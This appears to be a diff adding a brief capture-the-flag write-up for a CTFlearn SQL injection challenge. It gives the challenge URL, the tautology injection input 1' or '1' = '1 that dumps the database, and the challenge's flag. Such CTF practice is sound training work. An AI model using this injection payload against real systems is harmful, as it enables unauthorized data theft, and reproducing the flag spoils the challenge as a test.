@@ -1,0 +1,12 @@
+task:
+
+See if you can leak the whole database using what you know about SQL Injections. link
+
+Don't know where to begin? Check out CTFlearn's SQL Injection Lab
+
+sollution:
+go to: https://web.ctflearn.com/web4/
+
+input: 1' or '1' = '1
+
+flag: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs} 
